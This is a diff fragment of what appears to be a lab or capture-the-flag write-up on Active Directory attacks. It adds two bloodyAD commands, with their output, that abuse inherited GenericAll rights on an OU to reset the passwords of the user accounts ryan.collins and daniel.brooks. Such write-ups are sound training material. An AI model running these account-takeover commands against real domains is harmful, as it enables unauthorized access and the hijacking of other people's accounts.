@@ -716,5 +716,16 @@ Neither group has any description in bloodhound, so i think the safe move might 
 Since i have applied a inheritance rule to the OU the connect childs user accounts should also have GenericAll so ill just change their passwords
 
 ```python
-
+bloodyAD --host dc.novaforge.local -d novaforge.local -u steve.miller -p 'Password123!' set password 'ryan.collins' 'Password123!' 
+[+] Password changed successfully!
 ```
+
+This changed the password of `ryan.collins`
+
+```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -u steve.miller -p 'Password123!' set password 'daniel.brooks' 'Password123!' 
+[+] Password changed successfully!
+```
+
+This changed the password of `daniel.brooks`
+
